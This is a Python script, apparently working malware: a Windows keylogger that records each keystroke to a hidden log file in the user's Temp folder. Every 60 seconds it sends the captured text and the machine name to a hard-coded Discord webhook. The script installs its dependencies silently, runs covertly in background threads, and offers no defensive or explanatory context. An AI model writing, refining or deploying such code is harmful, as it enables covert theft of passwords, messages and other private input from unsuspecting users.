import threading,time

def checkModules():
    try:
        import os,keyboard,requests
        print("Modules installed already")
    except ModuleNotFoundError as err:
        if "keyboard" in str(err):
            os.system("pip3 install keyboard")
            print("Keyboard module installed")
            checkModules()
        elif "requests" in str(err):
            os.run("pip3 install requests")
            print("Requests module installed")
            checkModules()

def readKey():
    import os,keyboard
    last_key = None
    with open("C:\\Users\\"+str(os.getlogin())+"\\AppData\\Local\\Temp\\AnonSec.log","w") as f:
        while True:
            data=keyboard.read_key()
            if data != last_key:
                if data == "space":
                    data = " "
                elif data == "enter":
                    data = "\n"
                elif data == "tab":
                    data = "\t"
                elif data in ["shift","right shift","left shift","caps lock"]:
                    data = ""
                elif data in ["backspace","delete","del","ctrl","left ctrl","right ctrl","alt","left alt","right alt","fn","left windows","right windows"]:
                    data = f"[{data}]"
                f.write(data)
                f.flush()
                last_key = data
            elif data == last_key:
                data = ""
                last_key = None


def sendKeys(datah):
    import os,requests,time
    webhook_link="https://discord.com/api/webhooks/1335192723929436190/_sbQ8IozfcSj9gpLP-5wLv1U3lIj79oMwnsy19qxxum6vAQM04PchWvdAwONL1jZ2Vz-"
    requests.post(webhook_link,json={'embeds':[{"title":"Log from "+str(os.environ["COMPUTERNAME"])+" at "+str(time.strftime("%Y-%m-%d %H:%M:%S")),"description":datah}]})

def runSend():
    import time,os
    while True:
        time.sleep(60)
        with open("C:\\Users\\"+str(os.getlogin())+"\\AppData\\Local\\Temp\\AnonSec.log","r+") as fh:
            datah=fh.readline()
            if datah:
                fh.seek(0)
                fh.truncate()
                sendKeys(datah)

checkModules()

threading.Thread(target=readKey,daemon=True).start()
threading.Thread(target=runSend,daemon=True).start()

while True:
    time.sleep(0.1)
